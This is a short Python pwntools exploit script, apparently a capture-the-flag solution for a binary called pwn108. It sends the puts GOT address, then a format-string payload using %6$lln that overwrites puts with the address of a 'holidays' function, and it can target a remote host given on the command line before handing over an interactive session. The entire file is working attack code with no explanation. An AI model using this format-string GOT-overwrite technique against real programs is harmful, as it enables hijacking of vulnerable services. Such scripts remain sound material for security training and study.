#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn108.pwn108'
binary = context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
io = start()

puts_got = binary.got['puts']
holiday = binary.symbols['holidays']

io.recvuntil(b"name]: ")
io.sendline(p64(puts_got))

io.recvuntil(b"No]: ")
io.sendline(b"%" + str(holiday).encode("utf-8") + b"s%6$lln")

io.interactive()
